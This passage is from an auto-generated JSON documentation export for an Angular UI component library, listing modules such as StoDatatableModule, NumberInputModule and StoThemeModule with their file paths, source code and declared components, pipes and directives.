              {
                "name": "NavDrawerListComponent"
              },
              {
                "name": "NavDrawerListItemComponent"
              }
            ]
          },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "NumberInputModule",
        "id": "module-NumberInputModule-58a9496a039a2bb1b9fc388213f85e01ea3d4ec7ac77991e66faa22ec04a989a67126523d30f8d638ffa0ae6e3d90bab79f1547fb96973d1b7877542b6cc4446",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/form/src/lib/number-input/number-input.module.ts",
        "methods": [],
        "sourceCode": "import { NgModule } from '@angular/core';\r\nimport { CommonModule } from '@angular/common';\r\nimport { NumberUnitInputComponent } from './number-unit-input/number-unit-input.component';\r\nimport { ReactiveFormsModule } from '@angular/forms';\r\nimport { MatSelectModule } from '@angular/material/select';\r\nimport { NumberInputComponent } from './number-input/number-input.component';\r\nimport { NumberInputDirective } from './number-input.directive';\r\nimport { NumberInputPipe } from './number-input.pipe';\r\n\r\n\r\n@NgModule({\r\n  declarations: [ NumberUnitInputComponent, NumberInputComponent, NumberInputDirective, NumberInputPipe ],\r\n  imports: [\r\n    CommonModule,\r\n    ReactiveFormsModule,\r\n    MatSelectModule,\r\n  ],\r\n  exports: [\r\n    NumberUnitInputComponent, NumberInputComponent, NumberInputDirective, NumberInputPipe\r\n  ],\r\n  providers: [ NumberInputPipe ]\r\n})\r\nexport class NumberInputModule {\r\n}\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "NumberInputComponent"
              },
              {
                "name": "NumberInputDirective"
              },
              {
                "name": "NumberInputPipe"
              },
              {
                "name": "NumberUnitInputComponent"
              }
            ]
          },
          {
            "type": "imports",
            "elements": []
          },
          {
            "type": "exports",
            "elements": [
              {
                            "name": "NumberInputComponent"
                        },
                        {
                          "name": "NumberInputDirective"
                        },
              {
                "name": "NumberInputPipe"
              },
              {
                "name": "NumberUnitInputComponent"
              }
            ]
          },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "PreferenceManagerModule",
        "id": "module-PreferenceManagerModule-6ca78a64bdc3cc0fdb29282021a1544a1f13f0e62c6c306b39aeeebdd8682e14b11a894aa9e56159c87a12827ee5221db5936a620cf3d0e96a02689063dfe9a7",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/common/src/lib/preference-manager/preference-manager.module.ts",
        "methods": [],
        "sourceCode": "import { NgModule } from '@angular/core';\r\nimport { CommonModule } from '@angular/common';\r\nimport { PreferenceManagerComponent } from './preference-manager.component';\r\nimport { MatMenuModule } from '@angular/material/menu';\r\nimport { MatIconModule } from '@angular/material/icon';\r\nimport { MatButtonModule } from '@angular/material/button';\r\nimport { ActivePreferencePipe } from './active-preference.pipe';\r\nimport { MatFormFieldModule } from '@angular/material/form-field';\r\nimport { MatInputModule } from '@angular/material/input';\r\nimport { MatProgressSpinnerModule } from '@angular/material/progress-spinner';\r\n\r\n\r\n@NgModule({\r\n  declarations: [ PreferenceManagerComponent, ActivePreferencePipe ],\r\n  exports: [ PreferenceManagerComponent ],\r\n  imports: [\r\n    CommonModule,\r\n    MatMenuModule,\r\n    MatIconModule,\r\n    MatButtonModule,\r\n    MatFormFieldModule,\r\n    MatInputModule,\r\n    MatProgressSpinnerModule\r\n  ]\r\n})\r\nexport class PreferenceManagerModule {\r\n}\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "ActivePreferencePipe"
              },
              {
                "name": "PreferenceManagerComponent"
              }
            ]
          },
          {
            "type": "imports",
            "elements": []
          },
          {
            "type": "exports",
            "elements": [
              {
                "name": "PreferenceManagerComponent"
              }
            ]
          },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "SlideToggleModule",
        "id": "module-SlideToggleModule-f11db205122a0a9df66af5f6a47284c07d82ce5cc3ec750f6221b0f609417aff6a7773be63c6aa1432e6872eace5c0ac98d92c835d92894cadd7d0d4bf2d6359",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/form/src/lib/slide-toggle/slide-toggle.module.ts",
        "methods": [],
        "sourceCode": "import { NgModule } from '@angular/core';\r\nimport { CommonModule } from '@angular/common';\r\nimport { SlideToggleComponent } from './slide-toggle.component';\r\nimport { MatSlideToggleModule } from '@angular/material/slide-toggle';\r\nimport { ReactiveFormsModule } from '@angular/forms';\r\n\r\n@NgModule({\r\n  declarations: [ SlideToggleComponent ],\r\n  exports: [ SlideToggleComponent ],\r\n  imports: [\r\n    CommonModule,\r\n    MatSlideToggleModule,\r\n    ReactiveFormsModule\r\n  ]\r\n})\r\nexport class SlideToggleModule {\r\n}\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "SlideToggleComponent"
              }
            ]
          },
          {
            "type": "imports",
            "elements": []
          },
          {
            "type": "exports",
            "elements": [
              {
                "name": "SlideToggleComponent"
              }
            ]
          },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "StoActionFooterModule",
        "id": "module-StoActionFooterModule-374a6283e60734622b0aa97b080a777d8ac7a7ab1ed36265deff29a929ab950d2d6f6e2f5c980520838f95ebc0ac3e50110323ffe608eb28fceee942548b7e39",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/common/src/lib/sto-action-footer/sto-action-footer.module.ts",
        "methods": [],
        "sourceCode": "import { NgModule } from '@angular/core';\r\nimport { CommonModule } from '@angular/common';\r\nimport { MatButtonModule } from '@angular/material/button';\r\nimport { MatButtonToggleModule } from '@angular/material/button-toggle';\r\nimport { MatIconModule } from '@angular/material/icon';\r\nimport { MatProgressBarModule } from '@angular/material/progress-bar';\r\nimport { StoActionFooterComponent } from './sto-action-footer.component';\r\n\r\n@NgModule({\r\n  imports: [CommonModule, MatIconModule, MatButtonModule, MatButtonToggleModule, MatProgressBarModule],\r\n  exports: [StoActionFooterComponent],\r\n  declarations: [StoActionFooterComponent]\r\n})\r\nexport class StoActionFooterModule {\r\n}\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "StoActionFooterComponent"
              }
            ]
          },
          {
            "type": "imports",
            "elements": []
          },
          {
            "type": "exports",
            "elements": [
              {
                "name": "StoActionFooterComponent"
              }
            ]
          },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "StoAppHeaderModule",
        "id": "module-StoAppHeaderModule-ccf56c8314587fe181e5ba7e9a8729300538c2411d6f643c4687b4e90827c31350b0c337e33a658567c25bb3214cd2b0043533daf54e6c056f8b06f183cd92e8",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/common/src/lib/sto-app-header/sto-app-header.module.ts",
        "methods": [],
        "sourceCode": "import { NgModule } from '@angular/core';\r\nimport { CommonModule } from '@angular/common';\r\nimport { StoAppHeaderComponent } from './sto-app-header.component';\r\nimport { StoBreadcrumbsModule } from '../sto-breadcrumbs/sto-breadcrumbs.module';\r\nimport { MatButtonModule } from '@angular/material/button';\r\nimport { MatIconModule } from '@angular/material/icon';\r\nimport { MatMenuModule } from '@angular/material/menu';\r\nimport { LayoutModule } from '@angular/cdk/layout';\r\n\r\n@NgModule({\r\n  imports: [\r\n    CommonModule,\r\n    StoBreadcrumbsModule,\r\n    MatButtonModule,\r\n    MatIconModule,\r\n    MatMenuModule,\r\n    LayoutModule\r\n  ],\r\n  declarations: [ StoAppHeaderComponent ],\r\n  exports: [ StoAppHeaderComponent ],\r\n})\r\nexport class StoAppHeaderModule {\r\n}\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "StoAppHeaderComponent"
              }
            ]
          },
          {
            "type": "imports",
            "elements": [
              {
                "name": "StoBreadcrumbsModule"
              }
            ]
          },
          {
            "type": "exports",
            "elements": [
              {
                "name": "StoAppHeaderComponent"
              }
            ]
          },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "StoBreadcrumbsModule",
        "id": "module-StoBreadcrumbsModule-9284e560c5d72de0ec195fbaae9c7898a57516fe5fc8e1254d68c5c061c509c44100099964015c43d97d4c055869f1461e75cec086e62045fe1d765ee0493a47",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.module.ts",
        "methods": [],
        "sourceCode": "import { NgModule } from '@angular/core';\r\nimport { CommonModule } from '@angular/common';\r\nimport { RouterModule } from '@angular/router';\r\nimport { MatIconModule } from '@angular/material/icon';\r\nimport { StoBreadcrumbsComponent } from './sto-breadcrumbs.component';\r\n\r\n@NgModule({\r\n  imports: [ CommonModule, RouterModule, MatIconModule ],\r\n  exports: [ StoBreadcrumbsComponent ],\r\n  declarations: [ StoBreadcrumbsComponent ]\r\n})\r\nexport class StoBreadcrumbsModule {\r\n}\r\n\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "StoBreadcrumbsComponent"
              }
            ]
          },
          {
            "type": "imports",
            "elements": []
          },
          {
            "type": "exports",
            "elements": [
              {
                "name": "StoBreadcrumbsComponent"
              }
            ]
          },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "StoDatatableModule",
        "id": "module-StoDatatableModule-b56398b603a5e161b5afe8cfb55268418ad9d7e6bae138cd91d1b930dac35b6f67e0802685cec55edbe1a5bf6c47f0f231c05327b09909a4c48b580331eadfa9",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/datatable/src/lib/sto-datatable/sto-datatable.module.ts",
        "methods": [],
        "sourceCode": "import { NgModule } from '@angular/core';\r\nimport { CommonModule } from '@angular/common';\r\nimport { StoDatatableComponent } from './sto-datatable.component';\r\nimport { ScrollingModule } from '@angular/cdk/scrolling';\r\nimport { StoDatatableBodyComponent } from './sto-datatable-body/sto-datatable-body.component';\r\nimport { ExecPipe } from './exec.pipe';\r\nimport { StoDatatableBodyRowComponent } from './sto-datatable-body/sto-datatable-body-row/sto-datatable-body-row.component';\r\nimport { StoDatatableHeaderGroupComponent } from './sto-datatable-header-group/sto-datatable-header-group.component';\r\nimport { StoDatatableHeaderComponent } from './sto-datatable-header/sto-datatable-header.component';\r\nimport { MatIconModule } from '@angular/material/icon';\r\nimport { StoDatatableResizeDirective } from './sto-datatable-header/sto-datatable-resize.directive';\r\nimport { ColumnStylePipe } from './column-style.pipe';\r\nimport { MatRippleModule } from '@angular/material/core';\r\nimport {\r\n  StoDatatableActionsComponent,\r\n  StoDataTableActionsLeftComponent,\r\n  StoDataTableActionsRightComponent\r\n} from './sto-datatable-actions/sto-datatable-actions.component';\r\n\r\n@NgModule({\r\n  imports: [\r\n    CommonModule,\r\n    ScrollingModule,\r\n    MatIconModule,\r\n    MatRippleModule,\r\n  ],\r\n  declarations: [\r\n    StoDatatableComponent\r\n    , StoDatatableBodyComponent\r\n    , ExecPipe\r\n    , StoDatatableBodyRowComponent\r\n    , StoDatatableHeaderGroupComponent\r\n    , StoDatatableHeaderComponent\r\n    , StoDatatableResizeDirective\r\n    , ColumnStylePipe\r\n    , StoDataTableActionsLeftComponent\r\n    , StoDataTableActionsRightComponent\r\n    , StoDatatableActionsComponent,\r\n  ],\r\n  exports: [ StoDatatableComponent, StoDataTableActionsLeftComponent, StoDataTableActionsRightComponent, StoDatatableActionsComponent ],\r\n})\r\nexport class StoDatatableModule {\r\n}\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "ColumnStylePipe"
              },
              {
                "name": "ExecPipe"
              },
              {
                "name": "StoDataTableActionsLeftComponent"
              },
              {
                "name": "StoDataTableActionsRightComponent"
              },
              {
                "name": "StoDatatableActionsComponent"
              },
              {
                "name": "StoDatatableBodyComponent"
              },
              {
                "name": "StoDatatableBodyRowComponent"
              },
              {
                            "name": "StoDatatableComponent"
                        },
                        {
                            "name": "StoDatatableHeaderComponent"
                        },
                        {
                            "name": "StoDatatableHeaderGroupComponent"
                        },
                        {
                            "name": "StoDatatableResizeDirective"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "StoDataTableActionsLeftComponent"
                        },
                        {
                          "name": "StoDataTableActionsRightComponent"
                        },
                      {
                        "name": "StoDatatableActionsComponent"
                      },
                      {
                        "name": "StoDatatableComponent"
                      }
                    ]
                },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "StoDirectivesModule",
        "id": "module-StoDirectivesModule-a79ecca143ac8e5e5f6874704c9c88ebb6edcee676b2e6a139b17d6f34536917f466374abb6c5e3fa97959c73e7a352a203971f94a5ecf131652ccdade4797e7",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/core/src/lib/sto-directives/directives.module.ts",
        "methods": [],
        "sourceCode": "import { NgModule } from '@angular/core';\r\nimport { CommonModule } from '@angular/common';\r\nimport { QuickKeysDirective } from './quick-keys.directive';\r\nimport { DateFormFieldClickDirective } from './date-form-field-click.directive';\r\nimport { StoSelectTextOnFocusDirective } from './sto-select-text-on-focus.directive';\r\nimport { StoGridColumnDirective, StoGridDirective, StoGridSpacerDirective } from './sto-grid.directive';\r\nimport { LayoutModule } from '@angular/cdk/layout';\r\nimport { MenuOverlayDirective } from './menu-overlay.directive';\r\nimport { ContextMenuDirective } from './context-menu.directive';\r\n\r\n\r\n@NgModule({\r\n  imports: [ CommonModule, LayoutModule ],\r\n  declarations: [\r\n    QuickKeysDirective\r\n    , DateFormFieldClickDirective\r\n    , StoSelectTextOnFocusDirective\r\n    , StoGridDirective\r\n    , StoGridColumnDirective\r\n    , StoGridSpacerDirective\r\n    , MenuOverlayDirective\r\n    , ContextMenuDirective\r\n  ],\r\n  exports: [\r\n    QuickKeysDirective\r\n    , DateFormFieldClickDirective\r\n    , StoSelectTextOnFocusDirective\r\n    , StoGridDirective\r\n    , StoGridColumnDirective\r\n    , StoGridSpacerDirective\r\n    , MenuOverlayDirective\r\n    , ContextMenuDirective\r\n  ]\r\n})\r\nexport class StoDirectivesModule {\r\n}\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "ContextMenuDirective"
              },
              {
                "name": "DateFormFieldClickDirective"
              },
              {
                "name": "MenuOverlayDirective"
              },
              {
                "name": "QuickKeysDirective"
              },
              {
                "name": "StoGridColumnDirective"
              },
              {
                "name": "StoGridDirective"
              },
              {
                "name": "StoGridSpacerDirective"
              },
              {
                            "name": "StoSelectTextOnFocusDirective"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "ContextMenuDirective"
                        },
                        {
                            "name": "DateFormFieldClickDirective"
                        },
                        {
                            "name": "MenuOverlayDirective"
                        },
                        {
                            "name": "QuickKeysDirective"
                        },
                        {
                            "name": "StoGridColumnDirective"
                        },
                        {
                          "name": "StoGridDirective"
                        },
                      {
                        "name": "StoGridSpacerDirective"
                      },
                      {
                        "name": "StoSelectTextOnFocusDirective"
                      }
                    ]
                },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "StoDrawerModule",
        "id": "module-StoDrawerModule-0504c611e076a7cf09dd0fd65cb1b06c01bcac4b8ed853cd49f9ec7785917be65476a5daf14197abbd06fa057be66cba0cf31f754b621e985f99b823cf8fa70c",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/drawer/src/lib/sto-drawer/sto-drawer.module.ts",
        "methods": [],
        "sourceCode": "import { NgModule } from '@angular/core';\r\nimport { CommonModule } from '@angular/common';\r\nimport { RouterModule } from '@angular/router';\r\nimport { StoDrawerComponent } from './sto-drawer.component';\r\nimport { StoDrawerWrapperComponent } from './sto-drawer-wrapper.component';\r\nimport { StoDrawerFooterComponent } from './sto-drawer-footer.component';\r\nimport { StoDrawerHeaderComponent } from './sto-drawer-header.component';\r\n\r\n\r\n@NgModule({\r\n  imports: [ CommonModule, RouterModule ],\r\n  exports: [ StoDrawerComponent, StoDrawerWrapperComponent, StoDrawerFooterComponent, StoDrawerHeaderComponent ],\r\n  declarations: [ StoDrawerComponent, StoDrawerWrapperComponent, StoDrawerFooterComponent, StoDrawerHeaderComponent ]\r\n})\r\nexport class StoDrawerModule {\r\n}\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "StoDrawerComponent"
              },
              {
                "name": "StoDrawerFooterComponent"
              },
              {
                "name": "StoDrawerHeaderComponent"
              },
              {
                "name": "StoDrawerWrapperComponent"
              }
            ]
          },
          {
            "type": "imports",
            "elements": []
          },
          {
            "type": "exports",
            "elements": [
              {
                            "name": "StoDrawerComponent"
                        },
                        {
                          "name": "StoDrawerFooterComponent"
                        },
              {
                "name": "StoDrawerHeaderComponent"
              },
              {
                "name": "StoDrawerWrapperComponent"
              }
            ]
          },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "StoFilterPanelModule",
        "id": "module-StoFilterPanelModule-053b81f697e73c744134bbd0f800dfea3ca414b9039c588985ed269d5c132e2dece73afd09af507445e7f64f539d204134b93db2920376d5997a3dfdf8fd5021",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/common/src/lib/sto-filter/sto-filter-panel.module.ts",
        "methods": [],
        "sourceCode": "import { NgModule } from '@angular/core';\r\nimport { CommonModule } from '@angular/common';\r\nimport { MatButtonModule } from '@angular/material/button';\r\nimport { MatButtonToggleModule } from '@angular/material/button-toggle';\r\nimport { MatExpansionModule } from '@angular/material/expansion';\r\nimport { MatIconModule } from '@angular/material/icon';\r\nimport { MatTooltipModule } from '@angular/material/tooltip';\r\nimport {\r\n  StoFilterActions,\r\n  StoFilterActionsBar,\r\n  StoFilterPanelComponent,\r\n  StoFilterTableActions,\r\n  StoFilterTitle\r\n} from './sto-filter-panel.component';\r\nimport { MatChipsModule } from '@angular/material/chips';\r\n\r\n@NgModule({\r\n  imports: [ CommonModule, MatExpansionModule, MatIconModule, MatButtonModule, MatButtonToggleModule, MatTooltipModule, MatChipsModule ],\r\n  exports: [StoFilterPanelComponent, StoFilterTitle, StoFilterActions, StoFilterTableActions],\r\n  declarations: [StoFilterPanelComponent, StoFilterTitle, StoFilterActions, StoFilterActionsBar, StoFilterTableActions]\r\n})\r\nexport class StoFilterPanelModule {\r\n}\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "StoFilterActions"
              },
              {
                "name": "StoFilterActionsBar"
              },
              {
                "name": "StoFilterPanelComponent"
              },
              {
                "name": "StoFilterTableActions"
              },
              {
                "name": "StoFilterTitle"
              }
            ]
          },
          {
            "type": "imports",
            "elements": []
          },
          {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "StoFilterActions"
                        },
                        {
                          "name": "StoFilterPanelComponent"
                        },
                      {
                        "name": "StoFilterTableActions"
                      },
                      {
                        "name": "StoFilterTitle"
                      }
                    ]
          },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "StoFormModule",
        "id": "module-StoFormModule-c1510550ff18a386dce4d74a3c41446e39a0a3a66847cb46eca6427146f87aea1a0acb6aedbb45d49248c808879b13245ada1dd2619da58fc6cd84847f626778",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/form/src/lib/sto-form/sto-form.module.ts",
        "methods": [],
        "sourceCode": "import { NgModule } from '@angular/core';\r\nimport { CommonModule } from '@angular/common';\r\nimport { FormFieldDirective } from './form-field.directive';\r\nimport { MatFormFieldModule } from '@angular/material/form-field';\r\n\r\n@NgModule({\r\n  declarations: [ FormFieldDirective ],\r\n  imports: [\r\n    CommonModule,\r\n    MatFormFieldModule\r\n  ],\r\n  exports: [ FormFieldDirective ],\r\n  providers: [\r\n    // { provide: MAT_FORM_FIELD_DEFAULT_OPTIONS, useValue: { appearance: 'fill' }}\r\n  ]\r\n})\r\nexport class StoFormModule {\r\n}\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "FormFieldDirective"
              }
            ]
          },
          {
            "type": "imports",
            "elements": []
          },
          {
            "type": "exports",
            "elements": [
              {
                "name": "FormFieldDirective"
              }
            ]
          },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "StoMessagePanelModule",
        "id": "module-StoMessagePanelModule-e0ea4e1a70e0aca2ce2f1c63bb6cc11344fdf9ea285925d8be30e0dc79e3e9d36a7e0ee450106c91ba9cbcf6d458f63724a4bd530f6a79057332d478019c7dcf",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/common/src/lib/sto-message-panel/sto-message-panel.module.ts",
        "methods": [],
        "sourceCode": "import { NgModule } from '@angular/core';\r\nimport { CommonModule } from '@angular/common';\r\nimport { MatIconModule } from '@angular/material/icon';\r\nimport { MatTooltipModule } from '@angular/material/tooltip';\r\nimport { StoMessagePanelComponent } from './sto-message-panel.component';\r\nimport { MatButtonModule } from '@angular/material/button';\r\n\r\n\r\n@NgModule({\r\n  imports: [ CommonModule, MatIconModule, MatTooltipModule, MatButtonModule ],\r\n  exports: [StoMessagePanelComponent],\r\n  declarations: [StoMessagePanelComponent]\r\n})\r\nexport class StoMessagePanelModule {\r\n}\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "StoMessagePanelComponent"
              }
            ]
          },
          {
            "type": "imports",
            "elements": []
          },
          {
            "type": "exports",
            "elements": [
              {
                "name": "StoMessagePanelComponent"
              }
            ]
          },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "StoNavigationModule",
        "id": "module-StoNavigationModule-5dd80bbaa825fcdad1a440a9f37d04f23febe1182bc5a168a3dc986408762d866875f901e4ed276a5c8434baf34ab5a75ab79129e26484262382fb0d0c23b7cd",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/drawer/src/lib/sto-navigation/sto-navigation.module.ts",
        "methods": [],
        "sourceCode": "import { NgModule } from '@angular/core';\r\nimport { CommonModule } from '@angular/common';\r\nimport { NavigationPartComponent } from './navigation-part/navigation-part.component';\r\nimport { NavigationMenuComponent } from './navigation-menu/navigation-menu.component';\r\nimport { NavigationMenuItemComponent } from './navigation-menu/navigation-menu-item/navigation-menu-item.component';\r\nimport { MatButtonModule } from '@angular/material/button';\r\nimport { MatExpansionModule } from '@angular/material/expansion';\r\nimport { MatIconModule } from '@angular/material/icon';\r\nimport { MatListModule } from '@angular/material/list';\r\n\r\n\r\n@NgModule({\r\n  imports: [\r\n      CommonModule\r\n    , MatIconModule\r\n    , MatButtonModule\r\n    , MatListModule\r\n    , MatExpansionModule\r\n  ],\r\n  exports: [\r\n      NavigationPartComponent\r\n    , NavigationMenuComponent\r\n    , NavigationMenuItemComponent\r\n  ],\r\n  declarations: [\r\n      NavigationPartComponent\r\n    , NavigationMenuComponent\r\n    , NavigationMenuItemComponent\r\n  ],\r\n})\r\nexport class StoNavigationModule {\r\n}\r\n\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "NavigationMenuComponent"
              },
              {
                "name": "NavigationMenuItemComponent"
              },
              {
                "name": "NavigationPartComponent"
              }
            ]
          },
          {
            "type": "imports",
            "elements": []
          },
          {
            "type": "exports",
            "elements": [
              {
                "name": "NavigationMenuComponent"
              },
              {
                "name": "NavigationMenuItemComponent"
              },
              {
                "name": "NavigationPartComponent"
              }
            ]
          },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "StoPipesModule",
        "id": "module-StoPipesModule-304c9296916b7dfb40de9f3b1abab67a9976e1835a181ed7bad685dbd999956b3780fde5411f7bf6ed25bde4e4425bf1bb3fea178b04e2083346935046cdca33",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/core/src/lib/sto-pipes/sto-pipes.module.ts",
        "methods": [],
        "sourceCode": "import { NgModule } from '@angular/core';\r\nimport { CommonModule } from '@angular/common';\r\nimport { NumberFormatPipe } from './number-format.pipe';\r\nimport { CurrencyFormatPipe } from './currency-format.pipe';\r\nimport { KeysPipe } from './keys.pipe';\r\nimport { DateFormatPipe } from './date-format.pipe';\r\nimport { ExcludeUnit, GetUnit } from './with-unit';\r\nimport { YesNoPipe } from './yes-no';\r\n\r\n@NgModule({\r\n  imports: [CommonModule],\r\n  declarations: [\r\n    DateFormatPipe,\r\n    KeysPipe,\r\n    NumberFormatPipe,\r\n    CurrencyFormatPipe,\r\n    GetUnit,\r\n    ExcludeUnit,\r\n    YesNoPipe\r\n  ],\r\n  exports: [\r\n    DateFormatPipe,\r\n    KeysPipe,\r\n    NumberFormatPipe,\r\n    CurrencyFormatPipe,\r\n    GetUnit,\r\n    ExcludeUnit,\r\n    YesNoPipe\r\n  ]\r\n})\r\nexport class StoPipesModule {\r\n}\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "CurrencyFormatPipe"
              },
              {
                "name": "DateFormatPipe"
              },
              {
                "name": "ExcludeUnit"
              },
              {
                "name": "GetUnit"
              },
              {
                "name": "KeysPipe"
              },
              {
                "name": "NumberFormatPipe"
              },
              {
                "name": "YesNoPipe"
              }
            ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "CurrencyFormatPipe"
                        },
                        {
                            "name": "DateFormatPipe"
                        },
                        {
                            "name": "ExcludeUnit"
                        },
                        {
                            "name": "GetUnit"
                        },
                        {
                          "name": "KeysPipe"
                        },
                      {
                        "name": "NumberFormatPipe"
                      },
                      {
                        "name": "YesNoPipe"
                      }
                    ]
                },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "StoSelectFilterModule",
        "id": "module-StoSelectFilterModule-8597aedfa98e19f8d18ab80f67250ab0441f640e52603f7f76d6371ad5e754aeb216369ddf083c6af7f416a926041e12b4406e63142d31a6398622be2c0e21a7",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/form/src/lib/sto-select-filter/sto-select-filter.module.ts",
        "methods": [],
        "sourceCode": "import { FormsModule, ReactiveFormsModule } from '@angular/forms';\r\nimport { NgModule } from '@angular/core';\r\nimport { CommonModule } from '@angular/common';\r\nimport { StoSelectFilterComponent } from './sto-select-filter.component';\r\nimport { MatCheckboxModule } from '@angular/material/checkbox';\r\nimport { MatIconModule } from '@angular/material/icon';\r\nimport { MatInputModule } from '@angular/material/input';\r\n\r\n@NgModule({\r\n  imports: [\r\n    CommonModule,\r\n    MatInputModule, MatIconModule, MatCheckboxModule,\r\n    FormsModule, ReactiveFormsModule\r\n  ],\r\n  declarations: [StoSelectFilterComponent],\r\n  exports: [StoSelectFilterComponent],\r\n})\r\nexport class StoSelectFilterModule { }\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "StoSelectFilterComponent"
              }
            ]
          },
          {
            "type": "imports",
            "elements": []
          },
          {
            "type": "exports",
            "elements": [
              {
                "name": "StoSelectFilterComponent"
              }
            ]
          },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "StoThemeModule",
        "id": "module-StoThemeModule-c745dd10bb851f8b7996f3d87496a6ae149d83618221fddc7586a2815767a0a14539071f01c2d46b76e1b337c250a93fff45f4ac0de659500489d9e6f4f07752",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/common/src/lib/theme/theme.module.ts",
        "methods": [
          {
            "name": "forRoot",
            "args": [],
            "optional": false,
            "returnType": "ModuleWithProviders<StoThemeModule>",
            "typeParameters": [],
            "line": 13,
            "deprecated": false,
            "deprecationMessage": "",
            "modifierKind": [
              124
            ]
          }
        ],
        "sourceCode": "import { ModuleWithProviders, NgModule } from '@angular/core';\r\nimport { CommonModule } from '@angular/common';\r\nimport { StoThemeService } from './theme.service';\r\nimport { ThemeSaverService } from './theme-saver.service';\r\n\r\n@NgModule({\r\n  declarations: [],\r\n  imports: [\r\n    CommonModule\r\n  ]\r\n})\r\nexport class StoThemeModule {\r\n  static forRoot(): ModuleWithProviders<StoThemeModule> {\r\n    return {\r\n      ngModule: StoThemeModule,\r\n      providers: [\r\n        StoThemeService,\r\n        ThemeSaverService\r\n      ]\r\n    };\r\n  }\r\n}\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": []
          },
          {
            "type": "imports",
            "elements": []
          },
          {
            "type": "exports",
